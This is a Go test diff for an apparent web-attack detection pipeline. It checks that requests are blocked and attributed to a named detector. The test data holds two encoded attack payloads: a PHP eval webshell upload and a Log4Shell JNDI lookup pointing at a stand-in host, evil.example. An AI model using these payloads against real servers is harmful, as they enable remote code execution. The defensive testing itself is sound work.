@@ -851,11 +851,12 @@ func TestBuildPipelineWiresRCEUmbrellaCategories(t *testing.T) {
 	}
 
 	tests := []struct {
-		name     string
-		target   string
-		category string
+		name       string
+		target     string
+		category   string
+		detectorID string
 	}{
-		{name: "webshell", target: "/upload?payload=%3C%3Fphp%20eval(%24_POST%5B%27cmd%27%5D)%3B%20%3F%3E", category: "webshell"},
+		{name: "webshell", target: "/upload?payload=%3C%3Fphp%20eval(%24_POST%5B%27cmd%27%5D)%3B%20%3F%3E", category: "webshell", detectorID: "protection.webshell"},
 		{name: "log4shell", target: "/lookup?value=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D", category: "log4shell"},
 	}
 	for _, tc := range tests {
@@ -874,6 +875,9 @@ func TestBuildPipelineWiresRCEUmbrellaCategories(t *testing.T) {
 			}
 			if result == nil || result.Category != tc.category || result.Action != engine.ActionBlock {
 				t.Fatalf("expected production %s detection, got %+v", tc.category, result)
+			}
+			if tc.detectorID != "" && result.DetectorID != tc.detectorID {
+				t.Fatalf("expected detector %q, got %+v", tc.detectorID, result)
 			}
 		})
 	}
